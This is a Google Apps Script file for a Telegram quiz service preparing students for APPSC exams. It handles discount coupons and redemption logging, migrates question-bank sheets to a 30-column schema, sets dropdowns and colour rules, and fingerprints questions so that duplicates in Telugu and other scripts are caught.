/** Upper-cases and trims a code; the one normalisation every lookup uses. */
function normaliseCouponCode(code) {
  return String(code || '').trim().toUpperCase();
}

/** Reads a yes/no cell, with a default for blank. */
function yesNo(value, fallback) {
  var text = String(value === null || value === undefined ? '' : value).trim().toLowerCase();
  if (!text) return fallback;
  return !(text === 'no' || text === 'false' || text === 'off' || text === '0');
}

/** A date cell back as dd-mm-yyyy, whether Sheets stored text or a Date. */
function dateCellText(value) {
  if (value instanceof Date) {
    return Utilities.formatDate(value, 'Asia/Kolkata', 'dd-MM-yyyy');
  }
  return String(value || '').trim();
}

/** Turns a Coupons row into an object. */
function rowToCoupon(row, rowNumber) {
  var maxUses = String(row[5] === null || row[5] === undefined ? '' : row[5]).trim();
  return {
    code: normaliseCouponCode(row[0]),
    discount_type: String(row[1] || '').trim().toLowerCase(),
    discount_value: Number(row[2]) || 0,
    active: yesNo(row[3], true),
    expires_on: dateCellText(row[4]),
    max_uses: maxUses === '' ? null : (Number(maxUses) || 0),
    times_used: Number(row[6]) || 0,
    one_per_student: yesNo(row[7], true),
    note: String(row[8] || ''),
    created_by: String(row[9] || ''),
    created_at: String(row[10] || ''),
    updated_by: String(row[11] || ''),
    updated_at: String(row[12] || ''),
    row_number: rowNumber
  };
}

/** 1-based row of a coupon, or -1. */
function findCouponRow(sheet, code) {
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return -1;
  var target = normaliseCouponCode(code);
  var codes = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
  for (var i = 0; i < codes.length; i++) {
    if (normaliseCouponCode(codes[i][0]) === target) return i + 2;
  }
  return -1;
}

/** Every coupon, in sheet order. */
function listCoupons() {
  var sheet = couponSheet();
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return [];
  var values = sheet.getRange(2, 1, lastRow - 1, COUPON_HEADERS.length).getValues();
  var out = [];
  for (var i = 0; i < values.length; i++) {
    var coupon = rowToCoupon(values[i], i + 2);
    if (coupon.code) out.push(coupon);
  }
  return out;
}

/** How many times one student has paid with one code. */
function redemptionsBy(code, telegramId) {
  var ss = book();
  var sheet = ss.getSheetByName(REDEMPTION_SHEET);
  if (!sheet || sheet.getLastRow() <= 1 || !telegramId) return 0;
  var values = sheet.getRange(2, 2, sheet.getLastRow() - 1, 2).getValues();
  var target = normaliseCouponCode(code);
  var who = String(telegramId).trim();
  var count = 0;
  for (var i = 0; i < values.length; i++) {
    if (normaliseCouponCode(values[i][0]) === target && String(values[i][1] || '').trim() === who) count++;
  }
  return count;
}

/**
 * getCoupon — one coupon, plus how often this student already used it.
 *
 * @returns {Object|null} null when no such code exists
 */
function getCoupon(code, telegramId) {
  var sheet = couponSheet();
  var rowNumber = findCouponRow(sheet, code);
  if (rowNumber === -1) return null;
  var coupon = rowToCoupon(sheet.getRange(rowNumber, 1, 1, COUPON_HEADERS.length).getValues()[0], rowNumber);
  coupon.used_by_student = redemptionsBy(code, telegramId);
  return coupon;
}

/**
 * upsertCoupon — creates a code or updates one, keeping its usage count and
 * creation stamp. Field rules are enforced by the server; this only refuses
 * what could never be valid.
 */
function upsertCoupon(data, updatedBy) {
  var code = normaliseCouponCode(data.code);
  if (!/^[A-Z0-9_-]{3,20}$/.test(code)) throw new Error('Invalid coupon code: ' + code);
  var type = String(data.discount_type || '').toLowerCase();
  if (type !== 'percent' && type !== 'flat') throw new Error('Discount type must be percent or flat');

  return withScriptLock(function () {
    var sheet = couponSheet();
    var rowNumber = findCouponRow(sheet, code);
    var existing = rowNumber === -1 ? null
      : rowToCoupon(sheet.getRange(rowNumber, 1, 1, COUPON_HEADERS.length).getValues()[0], rowNumber);
    var now = istNow();
    var row = [
      code,
      type,
      Number(data.discount_value) || 0,
      data.active === false || data.active === 'no' ? 'no' : 'yes',
      // Leading apostrophe keeps Sheets from turning the date into a Date cell.
      data.expires_on ? "'" + String(data.expires_on) : '',
      data.max_uses === null || data.max_uses === undefined || data.max_uses === '' ? '' : Number(data.max_uses),
      existing ? existing.times_used : 0,
      data.one_per_student === false || data.one_per_student === 'no' ? 'no' : 'yes',
      safeCell(String(data.note || '').slice(0, 500)),
      existing ? existing.created_by : String(updatedBy || ''),
      existing ? existing.created_at : now,
      String(updatedBy || ''),
      now
    ];
    if (rowNumber === -1) {
      sheet.appendRow(row);
      rowNumber = sheet.getLastRow();
    } else {
      sheet.getRange(rowNumber, 1, 1, row.length).setValues([row]);
    }
    return getCoupon(code);
  });
}

/**
 * deleteCoupon — removes a code nobody has paid with yet. A used code is kept
 * so the redemption history still makes sense; switch it off instead.
 */
function deleteCoupon(code) {
  return withScriptLock(function () {
    var sheet = couponSheet();
    var rowNumber = findCouponRow(sheet, code);
    if (rowNumber === -1) return { deleted: false, reason: 'not found' };
    var coupon = rowToCoupon(sheet.getRange(rowNumber, 1, 1, COUPON_HEADERS.length).getValues()[0], rowNumber);
    if (coupon.times_used > 0) {
      return { deleted: false, reason: 'This code has been used ' + coupon.times_used +
        ' time(s). Switch it off instead, so its history stays readable.' };
    }
    sheet.deleteRow(rowNumber);
    return { deleted: true };
  });
}

/**
 * recordRedemption — logs a paid checkout that used a code and counts the use.
 * Idempotent on payment id: a repeated webhook changes nothing.
 *
 * @returns {{recorded: boolean, times_used: number}}
 */
function recordRedemption(data) {
  var code = normaliseCouponCode(data.code);
  var paymentId = String(data.payment_id || '').trim();
  return withScriptLock(function () {
    var log = redemptionSheet();
    if (log.getLastRow() > 1) {
      var ids = log.getRange(2, 9, log.getLastRow() - 1, 1).getValues();
      for (var i = 0; i < ids.length; i++) {
        if (String(ids[i][0] || '').trim() === paymentId) {
          var already = getCoupon(code);
          return { recorded: false, times_used: already ? already.times_used : 0 };
        }
      }
    }

    log.appendRow([
      istNow(), code, String(data.telegram_id || ''), safeCell(String(data.username || '')), String(data.group || ''),
      Number(data.original_amount) || 0, Number(data.discount) || 0, Number(data.paid_amount) || 0, paymentId
    ]);

    var sheet = couponSheet();
    var rowNumber = findCouponRow(sheet, code);
    var used = 0;
    if (rowNumber !== -1) {
      used = (Number(sheet.getRange(rowNumber, 7).getValue()) || 0) + 1;
      sheet.getRange(rowNumber, 7).setValue(used);
    }
    return { recorded: true, times_used: used };
  });
}

/** Newest-first redemptions, optionally for one code. */
function listRedemptions(params) {
  var ss = book();
  var sheet = ss.getSheetByName(REDEMPTION_SHEET);
  var empty = { total: 0, redemptions: [] };
  if (!sheet || sheet.getLastRow() <= 1) return empty;
  var values = sheet.getRange(2, 1, sheet.getLastRow() - 1, REDEMPTION_HEADERS.length).getValues();
  var code = normaliseCouponCode((params && params.code) || '');
  var limit = clampInt(params && params.limit, 100, 1, 500);
  var out = [];
  for (var i = values.length - 1; i >= 0; i--) {
    if (code && normaliseCouponCode(values[i][1]) !== code) continue;
    out.push({
      at: String(values[i][0] || ''),
      code: normaliseCouponCode(values[i][1]),
      telegram_id: String(values[i][2] || ''),
      username: String(values[i][3] || ''),
      group: String(values[i][4] || ''),
      original_amount: Number(values[i][5]) || 0,
      discount: Number(values[i][6]) || 0,
      paid_amount: Number(values[i][7]) || 0,
      payment_id: String(values[i][8] || '')
    });
  }
  return { total: out.length, redemptions: out.slice(0, limit) };
}

/** Creates every support and coupon tab. Safe to run repeatedly. */
function setupSupportSheets() {
  supportSheet();
  supportLogSheet();
  botSettingsSheet();
  couponSheet();
  redemptionSheet();
  book().toast('Support, Support Log, Bot Settings, Coupons and Coupon Redemptions tabs are ready.', 'Sadhana APPSC', 10);
}

// ============================================================================
// Sheet formatting & migration
// ============================================================================

/** Adds the canonical header row to a sheet that is missing or partially set up. */
function ensureSheetHeaders(sheet) {
  var lastCol = sheet.getLastColumn();
  var lastRow = sheet.getLastRow();

  if (lastRow === 0 || lastCol === 0) {
    formatSheetHeaders(sheet);
    return;
  }

  var current = sheet.getRange(1, 1, 1, Math.max(lastCol, 1)).getValues()[0]
    .map(function (h) { return normaliseHeader(h); });

  // If every canonical header is already present we leave the sheet alone.
  var missing = QUESTION_HEADERS.filter(function (h) {
    return headerAliases(h).every(function (alias) { return current.indexOf(alias) === -1; });
  });
  if (!missing.length) return;

  // Otherwise migrate the tab into the canonical layout without losing data.
  migrateSheetToCanonical(sheet);
}

/**
 * migrateSheetToCanonical — rewrites a sheet into the 30-column layout, moving
 * each existing value into its canonical column BY HEADER NAME. Safe to re-run.
 */
function migrateSheetToCanonical(sheet) {
  var lastRow = sheet.getLastRow();
  var lastCol = Math.max(sheet.getLastColumn(), 1);
  var map = headerMap(sheet);
  var name = sheet.getName();

  var oldData = lastRow > 1 ? sheet.getRange(2, 1, lastRow - 1, lastCol).getValues() : [];
  var migrated = [];
  var stamp = Utilities.formatDate(new Date(), 'Asia/Kolkata', 'yyyyMMdd');
  var code = subjectCode(name);

  for (var i = 0; i < oldData.length; i++) {
    var q = rowToQuestion(oldData[i], map, name, i);
    if (!q.question_text) continue;

    // Read Status from the raw cell rather than rowToQuestion, which defaults
    // it to 'Draft'. A v4 sheet has no Status column at all, and that default
    // would otherwise hide the fact that the row was already posted.
    var rawStatus = cell(oldData[i], map, 'Status');
    var wasPosted = q.posted.toUpperCase() === 'YES';

    var row = new Array(COL_COUNT).fill('');
    row[0]  = migrated.length + 1;
    row[1]  = q.question_id || (code + '-' + stamp + '-' + padNumber(migrated.length + 1, 4));
    row[2]  = q.date;
    row[3]  = q.newspaper;
    row[4]  = q.subject || name;
    row[5]  = q.topic;
    row[6]  = q.question_text;
    row[7]  = q.option_a;
    row[8]  = q.option_b;
    row[9]  = q.option_c;
    row[10] = q.option_d;
    row[11] = q.correct_answer;
    row[12] = q.explanation;
    row[13] = normaliseChoice(q.difficulty, DIFFICULTY_VALUES, 'Medium');
    row[14] = q.tags;
    row[15] = q.source_url;
    // A pre-existing posted row gets Status=Posted so the workflow column is
    // consistent with the Posted flag from day one.
    row[16] = STATUS_VALUES.indexOf(rawStatus) !== -1
      ? rawStatus
      : (wasPosted ? 'Posted' : 'Draft');
    row[17] = wasPosted ? 'YES' : 'NO';
    // Recover the timestamp the v2 layout buried inside the Posted cell.
    var recoveredPostedAt = (q.posted_at && q.posted_at !== '-')
      ? q.posted_at
      : postedTimestampFrom(q.posted_raw);
    row[18] = recoveredPostedAt;
    row[19] = q.scheduled_for;
    row[20] = q.thread_id;
    row[21] = q.telegram_msg_id === '-' ? '' : q.telegram_msg_id;
    row[22] = q.poll_id;
    row[23] = q.times_posted || (wasPosted ? 1 : 0);
    row[24] = q.added_at === '-' ? '' : q.added_at;
    row[25] = q.added_by;
    row[26] = q.updated_at;
    row[27] = q.updated_by;
    row[28] = q.dup_hash || hashQuestion(q.question_text);
    row[29] = q.review_notes;

    migrated.push(row);
  }

  sheet.clear();
  formatSheetHeaders(sheet);
  if (migrated.length) {
    sheet.getRange(2, 1, migrated.length, COL_COUNT).setValues(migrated);
  }
  applyPostedDataValidation(sheet);
  applyConditionalFormatting(sheet);
  return migrated.length;
}

/** Writes and styles the header row, sets column widths and freezes row 1. */
function formatSheetHeaders(sheet) {
  var headerRange = sheet.getRange(1, 1, 1, COL_COUNT);
  headerRange.setValues([QUESTION_HEADERS]);
  headerRange
    .setFontWeight('bold')
    .setFontColor('#ffffff')
    .setBackground('#1a237e')
    .setVerticalAlignment('middle')
    .setHorizontalAlignment('center')
    .setWrap(true);

  sheet.setFrozenRows(1);
  sheet.setFrozenColumns(2); // Keep S.No + Question ID visible while scrolling.
  sheet.setRowHeight(1, 44);

  // Per-column widths tuned for readability of long APPSC statements.
  var widths = [
    55,  140, 100, 130, 130, 150, 460, 190, 190, 190,
    190, 110, 420, 95,  180, 200, 110, 80,  180, 150,
    90,  140, 140, 100, 180, 220, 180, 200, 130, 240
  ];
  for (var c = 0; c < widths.length; c++) {
    sheet.setColumnWidth(c + 1, widths[c]);
  }

  // Long-form text columns wrap; everything else stays on one line.
  var wrapCols = [7, 8, 9, 10, 11, 13, 30];
  for (var w = 0; w < wrapCols.length; w++) {
    sheet.getRange(2, wrapCols[w], Math.max(sheet.getMaxRows() - 1, 1), 1)
      .setWrap(true).setVerticalAlignment('top');
  }

  applyPostedDataValidation(sheet);
  applyConditionalFormatting(sheet);
}

/** Adds the YES/NO, Status and Difficulty dropdowns. */
function applyPostedDataValidation(sheet) {
  var rows = Math.max(sheet.getMaxRows() - 1, 1);
  var map = headerMap(sheet);

  // The Posted column is not a two-value dropdown any more. It also carries
  // "SENDING | <when>" while a question is with Telegram but not yet confirmed,
  // and older rows carry the legacy "YES | <when>". A requireValueInList rule
  // REJECTS those writes outright — the script throws and Apps Script answers
  // with an HTML error page, so claiming a row failed with nothing in the
  // response that named the cause. Kept as a dropdown for the two values a
  // curator would ever pick by hand, but no longer rejecting what the poster
  // writes.
  var yesNo = SpreadsheetApp.newDataValidation()
    .requireValueInList(['YES', 'NO'], true).setAllowInvalid(true).build();
  sheet.getRange(2, colNum(map, 'Posted'), rows, 1).setDataValidation(yesNo);

  // Same for Status: it now includes "Sending", and a rule built before that
  // existed would reject it on any sheet whose validation was set earlier.
  var status = SpreadsheetApp.newDataValidation()
    .requireValueInList(STATUS_VALUES, true).setAllowInvalid(true).build();
  sheet.getRange(2, colNum(map, 'Status'), rows, 1).setDataValidation(status);

  var difficulty = SpreadsheetApp.newDataValidation()
    .requireValueInList(DIFFICULTY_VALUES, true).setAllowInvalid(false).build();
  sheet.getRange(2, colNum(map, 'Difficulty'), rows, 1).setDataValidation(difficulty);
}

/** Colour codes Posted, Status and Difficulty so state is readable at a glance. */
function applyConditionalFormatting(sheet) {
  var rows = Math.max(sheet.getMaxRows() - 1, 1);
  var map = headerMap(sheet);

  var postedRange = sheet.getRange(2, colNum(map, 'Posted'), rows, 1);
  var statusRange = sheet.getRange(2, colNum(map, 'Status'), rows, 1);
  var diffRange = sheet.getRange(2, colNum(map, 'Difficulty'), rows, 1);

  function rule(range, text, bg, fg) {
    return SpreadsheetApp.newConditionalFormatRule()
      .whenTextEqualTo(text)
      .setBackground(bg)
      .setFontColor(fg)
      .setRanges([range])
      .build();
  }

  sheet.setConditionalFormatRules([
    rule(postedRange, 'YES', '#c8e6c9', '#1b5e20'),
    rule(postedRange, 'NO',  '#ffcdd2', '#b71c1c'),
    rule(statusRange, 'Approved',  '#c8e6c9', '#1b5e20'),
    rule(statusRange, 'Posted',    '#bbdefb', '#0d47a1'),
    rule(statusRange, 'Scheduled', '#fff9c4', '#f57f17'),
    rule(statusRange, 'Review',    '#ffe0b2', '#e65100'),
    rule(statusRange, 'Rejected',  '#ffcdd2', '#b71c1c'),
    rule(statusRange, 'Archived',  '#eceff1', '#455a64'),
    rule(diffRange,   'Easy',      '#dcedc8', '#33691e'),
    rule(diffRange,   'Medium',    '#fff9c4', '#f57f17'),
    rule(diffRange,   'Hard',      '#ffccbc', '#bf360c')
  ]);
}

// ============================================================================
// Setup / migration entry points (run these manually from the editor)
// ============================================================================

/**
 * setupSpreadsheet — first-time setup. Creates the Config tab and one tab per
 * subject with the full 30-column layout. Existing tabs are left untouched
 * apart from having headers ensured.
 */
function setupSpreadsheet() {
  var ss = book();

  var config = ss.getSheetByName('Config');

  // Read any thread ids and cron settings that already exist BEFORE clearing.
  // These are the real Telegram forum topic ids created by `node setup.js`;
  // overwriting them with the defaults from subjectConfigList() would point every
  // subject at a topic that may not exist, which looks exactly like the topics
  // having been deleted.
  var existing = {};
  if (config && config.getLastRow() > 1) {
    var prior = config.getRange(2, 1, config.getLastRow() - 1, 6).getValues();
    for (var e = 0; e < prior.length; e++) {
      var name = String(prior[e][0] || '').trim();
      if (name) {
        existing[name] = {
          emoji: prior[e][1],
          threadId: prior[e][2],
          cron: String(prior[e][3] || '').trim(),
          count: prior[e][4],
          active: String(prior[e][5] || '').trim()
        };
      }
    }
  }

  if (!config) config = ss.insertSheet('Config');
  config.clear();

  var configHeaders = ['Subject', 'Emoji', 'Topic_Thread_ID', 'Schedule_Cron', 'Questions_Per_Batch', 'Active'];
  config.getRange(1, 1, 1, configHeaders.length).setValues([configHeaders])
    .setFontWeight('bold').setFontColor('#ffffff').setBackground('#1a237e');
  config.setFrozenRows(1);

  var configRows = subjectConfigList().map(function (s) {
    var prev = existing[s.subject];
    return [
      s.subject,
      prev && prev.emoji ? prev.emoji : '',
      // Keep whatever thread id is already there; only fall back to the default.
      prev && prev.threadId ? prev.threadId : s.threadId,
      prev && prev.cron ? prev.cron : s.cron,
      prev && prev.count ? prev.count : s.count,
      prev && prev.active ? prev.active : 'YES'
    ];
  });
  config.getRange(2, 1, configRows.length, configHeaders.length).setValues(configRows);
  [160, 70, 130, 150, 170, 80].forEach(function (w, i) { config.setColumnWidth(i + 1, w); });

  for (var i = 0; i < subjectConfigList().length; i++) {
    var name = subjectConfigList()[i].subject;
    var sheet = ss.getSheetByName(name);
    if (!sheet) {
      sheet = ss.insertSheet(name);
      formatSheetHeaders(sheet);
    } else {
      ensureSheetHeaders(sheet);
    }
  }

  book().toast(
    'Setup complete — ' + subjectConfigList().length + ' subject tabs on the 30-column schema.',
    'Sadhana APPSC', 10
  );
}

/**
 * upgradeSpreadsheet — run this when moving from the v4 16-column layout.
 * Migrates every existing question tab into the 30-column schema by header
 * name, preserving all data, then reports what it touched.
 */
function upgradeSpreadsheet() {
  var ss = book();
  var names = listSubjectSheets();
  var report = [];

  for (var i = 0; i < names.length; i++) {
    var sheet = ss.getSheetByName(names[i]);
    var migrated = migrateSheetToCanonical(sheet);
    report.push(names[i] + ': ' + migrated + ' rows');
  }

  // Make sure every configured subject has a tab, even if it was never created.
  for (var j = 0; j < subjectConfigList().length; j++) {
    var wanted = subjectConfigList()[j].subject;
    if (!ss.getSheetByName(wanted)) {
      formatSheetHeaders(ss.insertSheet(wanted));
      report.push(wanted + ': created');
    }
  }

  Logger.log('Upgrade report:\n' + report.join('\n'));
  ss.toast('Upgraded ' + report.length + ' tabs to the 30-column schema. See Logs for detail.', 'Sadhana APPSC', 15);
  return report;
}

/**
 * clearAllQuestions — DELETES EVERY QUESTION from every subject tab.
 *
 * Run this manually from the Apps Script editor when you want a clean start.
 * It is deliberately NOT reachable over HTTP: no doGet or doPost action calls
 * it, so no dashboard button and no stray request can ever wipe your bank.
 *
 * Each tab is rebuilt with the canonical 30-column header row, dropdowns and
 * colour rules, so this doubles as a schema reset. The Config tab, and the
 * Telegram thread ids in it, are left completely untouched.
 *
 * @returns {Array<string>} Per-tab report of how many rows were removed
 */
function clearAllQuestions() {
  var ss = book();
  var names = listSubjectSheets();
  var report = [];
  var removed = 0;

  for (var i = 0; i < names.length; i++) {
    var sheet = ss.getSheetByName(names[i]);
    var rows = Math.max(sheet.getLastRow() - 1, 0);
    removed += rows;

    sheet.clear();
    sheet.setConditionalFormatRules([]);
    formatSheetHeaders(sheet);

    report.push(names[i] + ': cleared ' + rows + ' row(s)');
  }

  Logger.log('clearAllQuestions:\n' + report.join('\n'));
  ss.toast('Cleared ' + removed + ' question(s) across ' + names.length + ' tabs. Config untouched.',
           'Sadhana APPSC', 15);
  return report;
}

/**
 * clearSubjectQuestions — deletes every question in ONE subject tab.
 * Editor only, for the same reason as clearAllQuestions.
 *
 * @param {string} subject Tab name, e.g. 'Polity'
 */
function clearSubjectQuestions(subject) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var rows = Math.max(sheet.getLastRow() - 1, 0);
  sheet.clear();
  sheet.setConditionalFormatRules([]);
  formatSheetHeaders(sheet);

  book().toast('Cleared ' + rows + ' question(s) from "' + subject + '".', 'Sadhana APPSC', 10);
  return rows;
}

/**
 * backfillQuestionIds — gives a Question ID and duplicate hash to any row that
 * is missing one, without touching anything else.
 *
 * Rows added before the 30-column migration, or pasted in by hand, have those
 * cells empty, which is what made editing and deleting them from the dashboard
 * fail to stick. Run this once if you have such rows and want them addressable
 * by id rather than relying on the row-number fallback.
 *
 * @returns {number} How many rows were given an id
 */
function backfillQuestionIds() {
  var ss = book();
  var names = listSubjectSheets();
  var filled = 0;

  for (var i = 0; i < names.length; i++) {
    var sheet = ss.getSheetByName(names[i]);
    var lastRow = sheet.getLastRow();
    if (lastRow <= 1) continue;

    var map = headerMap(sheet);
    var idCol = colNum(map, 'Question ID');
    var hashCol = colNum(map, 'Dup Hash');
    var qCol = colNum(map, 'Question');
    var code = subjectCode(names[i]);
    var stamp = Utilities.formatDate(new Date(), 'Asia/Kolkata', 'yyyyMMdd');

    for (var r = 2; r <= lastRow; r++) {
      var text = String(sheet.getRange(r, qCol).getValue() || '').trim();
      if (!text) continue;

      if (!String(sheet.getRange(r, idCol).getValue() || '').trim()) {
        sheet.getRange(r, idCol).setValue(code + '-' + stamp + '-' + padNumber(r - 1, 4));
        filled++;
      }
      // Missing, or written while non-Latin scripts hashed to nothing.
      var storedHash = String(sheet.getRange(r, hashCol).getValue() || '').trim();
      if (!storedHash || storedHash === degenerateHash()) {
        sheet.getRange(r, hashCol).setValue(hashQuestion(text));
      }
    }
  }

  ss.toast('Backfilled ' + filled + ' Question ID(s).', 'Sadhana APPSC', 10);
  return filled;
}

// ============================================================================
// Small utilities
// ============================================================================

/** Current time formatted the way every timestamp column in this book is stored. */
function istNow() {
  return Utilities.formatDate(new Date(), 'Asia/Kolkata', 'dd-MM-yyyy, hh:mm:ss a') + ' IST';
}

/** Three-letter prefix for Question IDs, from the master list or the name itself. */
function subjectCode(subject) {
  for (var i = 0; i < subjectConfigList().length; i++) {
    if (subjectConfigList()[i].subject === subject) return subjectConfigList()[i].code;
  }
  return String(subject || 'GEN').toUpperCase().replace(/[^A-Z]/g, '').substring(0, 3) || 'GEN';
}

/** Zero-pads a number to the requested width. */
function padNumber(n, width) {
  var s = String(n);
  while (s.length < width) s = '0' + s;
  return s;
}

/**
 * Characters that are only cosmetic: whitespace, ASCII punctuation, and the
 * common Unicode punctuation (quotes, dashes, ellipsis, the danda). Letters
 * and digits of EVERY script survive, which is the whole point — see
 * hashQuestion.
 */
var COSMETIC_CHARS = /[\s!-\/:-@\[-`{-~\u00A0\u00AB\u00BB\u0964\u0965\u2010-\u205E\u3000-\u303F\uFF01-\uFF0F\uFF1A-\uFF20]+/g;

/** How many Latin characters a question must have for the old hash to mean anything. */
var LEGACY_HASH_MIN_CHARS = 24;

/** The first 8 bytes of a SHA-256, as hex — the shape every Dup Hash has. */
function shortDigest(text) {
  var digest = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, text);
  var hex = '';
  for (var i = 0; i < 8; i++) {
    var b = (digest[i] + 256) % 256;
    hex += (b < 16 ? '0' : '') + b.toString(16);
  }
  return hex;
}

/**
 * hashQuestion — stable fingerprint of a question, used to detect duplicates.
 * The text is lowercased and stripped of punctuation and whitespace first, so
 * cosmetic edits do not create a "new" question.
 *
 * It used to strip everything outside a-z0-9, which threw away Telugu, Hindi
 * and every other non-Latin script: a whole upload of Telugu questions
 * normalised to the same empty string, so the first row was added and the rest
 * were refused as duplicates of it. Only punctuation is dropped now.
 */
function hashQuestion(text) {
  var normalised = String(text || '').toLowerCase().replace(COSMETIC_CHARS, '').substring(0, 4000);
  // Punctuation only (an image-only or "?" question): fall back to the raw
  // text, so two such rows are still told apart.
  if (!normalised) normalised = String(text || '').toLowerCase().substring(0, 4000);
  return shortDigest(normalised);
}

/**
 * legacyHashQuestion — the fingerprint this sheet used before non-Latin
 * scripts were kept, so a question added then is still recognised when it is
 * uploaded again.
 *
 * Returns '' when the old normalisation kept too little to identify anything
 * — which is exactly the case that was broken: every Telugu question collapsed
 * to the same few characters, and matching on that would refuse them all over
 * again.
 */
function legacyHashQuestion(text) {
  var normalised = String(text || '').toLowerCase().replace(/[^a-z0-9]+/g, '').substring(0, 4000);
  if (normalised.length < LEGACY_HASH_MIN_CHARS) return '';
  return shortDigest(normalised);
}

/**
 * The fingerprint every question in a non-Latin script used to get: the old
 * hash of an empty string. A row carrying it says nothing about its question,
 * so it is repaired rather than trusted.
 */
function degenerateHash() {
  return shortDigest('');
}

/** Whether a question is already in `existingHashes`, under either fingerprint. */
function isKnownQuestion(text, existingHashes) {
  if (existingHashes[hashQuestion(text)]) return true;
  var legacy = legacyHashQuestion(text);
  return Boolean(legacy && existingHashes[legacy]);
}

/** Coerces a value to one of a fixed set, case-insensitively, with a fallback. */
function normaliseChoice(value, allowed, fallback) {
  var v = String(value || '').trim().toLowerCase();
  for (var i = 0; i < allowed.length; i++) {
    if (allowed[i].toLowerCase() === v) return allowed[i];
  }
  return fallback;
}

/** Parses an integer query param, clamped into a safe range. */
function clampInt(value, fallback, min, max) {
  var n = parseInt(value, 10);
  if (isNaN(n)) return fallback;
  return Math.min(max, Math.max(min, n));
}

/** Wraps any object as a JSON TextOutput response. */
function jsonResponse(data) {
  return ContentService
    .createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}
